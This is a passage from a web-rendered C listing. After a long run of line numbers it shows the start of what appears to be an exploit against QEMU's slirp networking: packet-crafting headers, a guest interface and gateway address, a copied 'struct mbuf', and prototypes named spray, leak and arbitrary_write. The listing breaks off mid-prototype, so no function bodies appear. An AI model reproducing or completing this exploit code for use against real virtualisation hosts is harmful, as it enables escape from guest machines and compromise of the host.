class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> <span class="comment">// close()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> <span class="comment">// strcpy, memset(), and memcpy()</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netdb.h&gt;</span>      <span class="comment">// struct addrinfo</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span>  <span class="comment">// needed for socket(), uint8_t, uint16_t, uint32_t</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span> <span class="comment">// needed for socket()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span> <span class="comment">// IPPROTO_RAW, IPPROTO_IP, IPPROTO_TCP, INET_ADDRSTRLEN</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span> <span class="comment">// struct ip and IP_MAXPACKET (which is 65535)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip_icmp.h&gt;</span> <span class="comment">// struct icmp, ICMP_ECHO</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __FAVOR_BSD          <span class="comment">// Use BSD format of tcp header</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/tcp.h&gt;</span>     <span class="comment">// struct tcphdr</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span>       <span class="comment">// inet_pton() and inet_ntop()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>       <span class="comment">// macro ioctl is defined</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/ioctls.h&gt;</span>     <span class="comment">// defines values for argument &quot;request&quot; of ioctl.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span>          <span class="comment">// struct ifreq</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_ether.h&gt;</span>  <span class="comment">// ETH_P_IP = 0x0800, ETH_P_IPV6 = 0x86DD</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span> <span class="comment">// struct sockaddr_ll (see man 7 packet)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/ethernet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span> <span class="comment">// gettimeofday()</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span> <span class="comment">// errno, perror()</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Define some constants.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ETH_HDRLEN 14 <span class="comment">// Ethernet header length</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IP4_HDRLEN 20 <span class="comment">// IPv4 header length</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TCP_HDRLEN 20 <span class="comment">// TCP header length, excludes options data</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ICMP_HDRLEN 8 <span class="comment">// ICMP header length for echo request, excludes data</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> dbg_printf(fmt, ...)                                                   \</span></span><br><span class="line"><span class="meta">    do &#123;                                                                       \</span></span><br><span class="line"><span class="meta">        fprintf(stderr, <span class="string">&quot;%s:%d(): &quot;</span> fmt, __func__, __LINE__, ##__VA_ARGS__);   \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> dbg_printf(fmt, ...)                                                   \</span></span><br><span class="line"><span class="meta">    do &#123;                                                                       \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//char  g_interface[] = &quot;ens2&quot;;</span></span><br><span class="line"><span class="type">char</span>  g_interface[] = <span class="string">&quot;enp0s3&quot;</span>;</span><br><span class="line"><span class="type">char</span> host[] = <span class="string">&quot;10.0.2.2&quot;</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">void</span> *Slirp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> &#123;</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> &#123;</span></span><br><span class="line">    <span class="comment">/* XXX should union some of these! */</span></span><br><span class="line">    <span class="comment">/* header at beginning of each mbuf: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m_next</span>;</span> <span class="comment">/* Linked list of mbufs */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m_prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m_nextpkt</span>;</span> <span class="comment">/* Next packet in queue/record */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> *<span class="title">m_prevpkt</span>;</span> <span class="comment">/* Flags aren&#x27;t used in the output queue */</span></span><br><span class="line">    <span class="type">int</span> m_flags;            <span class="comment">/* Misc flags */</span></span><br><span class="line">    <span class="type">int</span> m_size;             <span class="comment">/* Size of mbuf, from m_dat or m_ext */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">m_so</span>;</span></span><br><span class="line">    <span class="type">caddr_t</span> m_data; <span class="comment">/* Current location of data */</span></span><br><span class="line">    <span class="type">int</span> m_len;      <span class="comment">/* Amount of data in this mbuf, from m_data */</span></span><br><span class="line">    Slirp *slirp;</span><br><span class="line">    <span class="type">bool</span> resolution_requested;</span><br><span class="line">    <span class="type">uint64_t</span> expiration_date;</span><br><span class="line">    <span class="type">char</span> *m_ext;</span><br><span class="line">    <span class="comment">/* start of dynamic buffer area, must be last element */</span></span><br><span class="line">    <span class="type">char</span> m_dat[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// some header info to pass to the send_ip_pkt</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_pkt_info</span> &#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> ip_id;</span><br><span class="line">    <span class="type">uint16_t</span> ip_off;</span><br><span class="line">    <span class="type">bool</span> MF;</span><br><span class="line">    <span class="type">uint8_t</span> ip_p;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Function prototypes</span></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">checksum</span><span class="params">(<span class="type">uint16_t</span> *, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">icmp4_checksum</span><span class="params">(<span class="keyword">struct</span> icmp, <span class="type">uint8_t</span> *, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">tcp4_checksum</span><span class="params">(<span class="keyword">struct</span> ip, <span class="keyword">struct</span> tcphdr, <span class="type">uint8_t</span> *, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">char</span> *<span class="title function_">allocate_strmem</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">uint8_t</span> *<span class="title function_">allocate_ustrmem</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> *<span class="title function_">allocate_intmem</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spray</span><span class="params">(<span class="type">int</span>, <span class="type">uint16_t</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">send_ip_pkt</span><span class="params">(<span class="keyword">struct</span> ip_pkt_info *, <span class="type">uint8_t</span> *, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak</span><span class="params">(<span class="type">uint64_t</span>, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">send_raw_pkt</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">arbitrary_write</span><span class="params">(<span class="type">uint64_t</span>, <span class="type">int</span>, <span class="type">uint8_t</span> *, <span class="type">int</span>, <span 